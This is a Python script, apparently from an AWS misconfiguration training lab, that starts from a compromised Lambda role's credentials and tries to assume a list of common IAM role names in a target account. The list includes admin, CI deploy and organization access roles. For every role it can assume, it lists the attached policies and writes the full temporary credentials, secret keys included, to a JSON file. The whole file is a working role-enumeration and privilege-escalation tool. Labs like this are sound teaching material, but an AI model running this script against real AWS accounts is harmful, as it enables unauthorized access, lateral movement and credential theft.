#!/usr/bin/env python3
"""
enum_roles.py
Intenta asumir roles conocidos en la cuenta y reporta cuáles son accesibles.

Uso:
    python3 enum_roles.py --profile lambda-role
    python3 enum_roles.py --profile lambda-role --account 351668480234
"""

import argparse
import json
import subprocess
import sys
from datetime import datetime, timezone


COMMON_ROLE_NAMES = [
    "corp-lambda-execution-role",
    "corp-ec2-instance-role",
    "corp-admin-role",
    "corp-ci-deploy-role",
    "corp-readonly-role",
    "corp-cross-account-role",
    "AdminRole",
    "OrganizationAccountAccessRole",
    "AWSReservedSSO_AdministratorAccess",
    "lambda-execution-role",
    "ec2-instance-role",
    "cross-account-role",
    "developer-role",
    "readonly-role",
    "backup-role",
    "support-role",
]


def banner():
    print("""
\033[91m
  ███████╗███╗   ██╗██╗   ██╗███╗   ███╗
  ██╔════╝████╗  ██║██║   ██║████╗ ████║
  █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
\033[0m
  \033[93maws-misconfig-lab\033[0m — IAM Role Enumerator + Chainer
  \033[90mSolo para uso en entornos de laboratorio controlados\033[0m
""")


def get_current_identity(profile: str) -> dict:
    """Obtiene la identidad actual del perfil."""
    cmd = ["aws", "sts", "get-caller-identity",
           "--profile", profile, "--output", "json"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"\033[91m[!] Perfil '{profile}' inválido o expirado.\033[0m")
        print(f"    Ejecuta primero: python3 refresh_creds.py")
        sys.exit(1)
    return json.loads(result.stdout)


def try_assume_role(role_arn: str, profile: str, region: str) -> dict | None:
    """Intenta asumir un role. Retorna credenciales si exitoso, None si denegado."""
    cmd = [
        "aws", "sts", "assume-role",
        "--role-arn", role_arn,
        "--role-session-name", "enum-test",
        "--region", region,
        "--profile", profile,
        "--output", "json",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        return json.loads(result.stdout)
    return None


def get_role_policies(role_name: str, profile: str, region: str) -> list:
    """Intenta listar las políticas del role."""
    cmd = [
        "aws", "iam", "list-attached-role-policies",
        "--role-name", role_name,
        "--region", region,
        "--profile", profile,
        "--output", "json",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        data = json.loads(result.stdout)
        return [p["PolicyName"] for p in data.get("AttachedPolicies", [])]
    return []


def enumerate_roles(account_id: str, profile: str, region: str) -> list:
    """Itera sobre nombres comunes e intenta asumir cada role."""
    print(f"\n\033[94m[1] Enumerando roles en cuenta {account_id}...\033[0m")
    print(f"    Probando {len(COMMON_ROLE_NAMES)} nombres comunes\n")

    accessible = []
    denied     = []

    for role_name in COMMON_ROLE_NAMES:
        role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
        print(f"  [*] {role_arn[:70]:<70}", end="", flush=True)

        creds = try_assume_role(role_arn, profile, region)

        if creds:
            print(f"\033[92m ACCESIBLE ✓\033[0m")
            policies = get_role_policies(role_name, profile, region)
            accessible.append({
                "role_name"  : role_name,
                "role_arn"   : role_arn,
                "access_key" : creds["Credentials"]["AccessKeyId"],
                "expiration" : creds["Credentials"]["Expiration"],
                "policies"   : policies,
                "credentials": creds["Credentials"],
            })
        else:
            print(f"\033[90m denegado\033[0m")
            denied.append(role_arn)

    return accessible, denied


def print_results(accessible: list, denied: list):
    """Imprime el resumen de roles accesibles."""
    print(f"\n\033[93m{'='*65}\033[0m")
    print(f"\033[93m  RESULTADOS\033[0m")
    print(f"\033[93m{'='*65}\033[0m")
    print(f"  Accesibles : \033[92m{len(accessible)}\033[0m")
    print(f"  Denegados  : \033[90m{len(denied)}\033[0m")

    if not accessible:
        print(f"\n  \033[93m[~] Ningún role adicional accesible desde el perfil actual\033[0m")
        return

    print(f"\n\033[92m  Roles accesibles:\033[0m")
    for r in accessible:
        print(f"\n  {'─'*60}")
        print(f"  Role     : {r['role_name']}")
        print(f"  ARN      : {r['role_arn']}")
        print(f"  Key ID   : {r['access_key']}")
        print(f"  Expira   : {r['expiration']}")
        if r["policies"]:
            print(f"  Políticas: {', '.join(r['policies'])}")
        else:
            print(f"  Políticas: (sin acceso a listar)")


def save_results(accessible: list, account_id: str):
    """Guarda los roles accesibles en JSON."""
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    filename = f"enum_roles_{ts}.json"
    data = {
        "timestamp" : datetime.now(timezone.utc).isoformat(),
        "account_id": account_id,
        "accessible": accessible,
    }
    with open(filename, "w") as f:
        json.dump(data, f, indent=2)
    print(f"\n  \033[92m[+] Resultados guardados en {filename}\033[0m")


def parse_args():
    parser = argparse.ArgumentParser(description="IAM Role Enumerator")
    parser.add_argument("--profile", default="lambda-role",
                        help="Perfil AWS (default: lambda-role)")
    parser.add_argument("--account", default="351668480234",
                        help="Account ID objetivo (default: 351668480234)")
    parser.add_argument("--region",  default="us-east-1",
                        help="Region AWS (default: us-east-1)")
    return parser.parse_args()


def main():
    banner()
    args = parse_args()

    print(f"\033[93m[~] Iniciando enumeración — {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\033[0m")

    # Verificar identidad actual
    print(f"\n\033[94m[0] Identidad actual...\033[0m")
    identity = get_current_identity(args.profile)
    print(f"  ARN     : {identity['Arn']}")
    print(f"  Account : {identity['Account']}")

    # Enumerar roles
    accessible, denied = enumerate_roles(args.account, args.profile, args.region)

    # Mostrar resultados
    print_results(accessible, denied)

    # Guardar
    if accessible:
        save_results(accessible, args.account)

    print(f"\n\033[92m[✓] Enumeración completa\033[0m\n")


if __name__ == "__main__":
    main()
